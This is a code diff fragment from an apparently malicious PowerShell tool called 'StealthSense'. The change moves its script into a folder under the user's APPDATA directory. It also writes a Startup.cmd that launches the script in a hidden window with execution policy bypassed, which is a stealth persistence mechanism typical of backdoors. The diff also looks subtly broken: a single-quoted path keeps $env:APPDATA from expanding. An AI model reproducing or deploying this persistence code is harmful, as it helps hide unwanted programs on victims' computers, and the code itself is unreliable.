@@ -131,8 +131,8 @@ if (`$connection) {
 }
 "@
 
-
-$StealthSense | Out-File .\StealthSense.ps1 -Force
+New-Item -ItemType Directory -Path $env:APPDATA\StealthSense
+$StealthSense | Out-File $env:APPDATA\StealthSense\StealthSense.ps1 -Force
 
 
 $Startup = @'
@@ -140,7 +140,7 @@ $Startup = @'
 Powershell -windowstyle hidden -noprofile -executionpolicy bypass -file ".\StealthSense.ps1" >> startup.log
 '@
 
-Set-Content -Path '.\Startup.cmd' -Value $Startup -Force
+Set-Content -Path '$env:APPDATA\StealthSense\Startup.cmd' -Value $Startup -Force
 
 
 $scriptPath = $MyInvocation.MyCommand.Definition 
